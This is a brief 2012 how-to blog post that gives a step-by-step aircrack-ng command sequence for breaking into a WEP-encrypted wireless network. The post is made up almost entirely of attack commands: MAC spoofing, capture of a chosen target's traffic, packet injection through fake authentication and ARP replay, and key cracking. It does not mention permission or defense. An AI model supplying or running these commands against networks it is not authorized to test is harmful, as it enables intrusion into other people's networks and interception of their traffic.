---
layout: post
title: simple aircrack WEP
date: 2012-08-29 12:32
author: admin
comments: true
categories: [how to, networking, ubuntu, ubuntu]
---
<strong>SETUP</strong>
<pre>airmon-ng airmon-ng stop (interface) ifconfig (interface) down macchanger --mac 00:11:22:33:44:55 (interface) airmon-ng start (interface) </pre>

<strong>PICK NET &amp; CAPTURE</strong>
<pre>airodump-ng (interface) airodump-ng -c (channel) -w (file name) --bssid (bssid) (interface)</pre>

<strong>GET MORE PACKET</strong>
<pre>aireplay-ng -1 0 -a (bssid) -h 00:11:22:33:44:55 -e (essid) (interface) aireplay-ng -3 -b (bssid) -h 00:11:22:33:44:55 (interface)</pre>

<strong>CRACK A LACKIN'</strong>
<pre>aircrack-ng -b (bssid) (file name-01.cap)</em></pre>


cheers.
